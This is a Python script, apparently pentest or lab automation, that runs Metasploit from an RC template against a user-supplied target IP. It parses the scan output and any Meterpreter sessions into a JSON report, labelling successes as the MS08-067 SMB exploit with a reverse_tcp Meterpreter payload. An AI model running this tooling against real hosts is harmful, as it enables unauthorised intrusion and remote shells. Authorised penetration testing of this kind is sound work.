import subprocess
import os
import re
import json
import datetime

def generate_rc_file(ip, rc_template_path='/app/scan_template.rc', rc_out_path='/app/scan_auto.rc'):
    with open(rc_template_path, 'r') as f:
        content = f.read()
    content = content.replace('192.168.75.130', ip)
    with open(rc_out_path, 'w') as f:
        f.write(content)
    print(f"[+] Fichier RC généré avec IP: {ip}")
    return rc_out_path

def run_msfconsole(rc_path):
    print("[*] Lancement de Metasploit avec msfconsole...")
    os.makedirs('/app/results', exist_ok=True)
    spool_path = '/app/results/spool.txt'
    cmd = ['msfconsole', '-q', '-r', rc_path]
    with open(spool_path, 'w') as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT)
    print(f"[+] Scan terminé. Résultat enregistré dans {spool_path}")
    return spool_path

def parse_spool_to_json(spool_path, target_ip):
    with open(spool_path, 'r') as f:
        lines = f.readlines()

    results = []
    exploits = []

    for line in lines:
        host_match = re.search(r'Host: (\d+\.\d+\.\d+\.\d+)', line)
        port_match = re.search(r'Port: (\d+)/tcp', line)
        state_match = re.search(r'State: (\w+)', line)
        service_match = re.search(r'Service: (\w+)', line)
        exploit_match = re.search(r'\[\*\] Meterpreter session (\d+) opened.*?(\d+\.\d+\.\d+\.\d+)', line)
        user_match = re.search(r'Username\s+:\s+(\w+)', line)
        platform_match = re.search(r'Platform\s+:\s+(\w+)', line)

        if host_match and port_match and state_match:
            results.append({
                "host": host_match.group(1),
                "port": int(port_match.group(1)),
                "state": state_match.group(1),
                "service": service_match.group(1) if service_match else ""
            })

        elif exploit_match:
            exploits.append({
                "exploit_module": "exploit/windows/smb/ms08_067_netapi",
                "payload": "windows/meterpreter/reverse_tcp",
                "status": "success",
                "session": {
                    "type": "meterpreter",
                    "session_id": int(exploit_match.group(1)),
                    "user": user_match.group(1) if user_match else "unknown",
                    "platform": platform_match.group(1) if platform_match else "unknown",
                    "host": exploit_match.group(2)
                }
            })

    output_data = {
        "scan_results": results,
        "exploit_results": exploits
    }

    timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    json_path = f"/app/results/result-{target_ip.replace('.', '_')}-{timestamp}.json"
    with open(json_path, 'w') as f:
        json.dump(output_data, f, indent=2)
    
    print(f"[+] Rapport JSON enregistré dans : {json_path}")
    return json_path

def main():
    ip = os.environ.get("TARGET_IP") or input("Merci de saisir l'adresse IP cible : ").strip()
    if not ip:
        print("[-] Aucune IP fournie. Abandon.")
        return

    rc_path = generate_rc_file(ip)
    spool_path = run_msfconsole(rc_path)
    parse_spool_to_json(spool_path, ip)

if __name__ == "__main__":
    main()
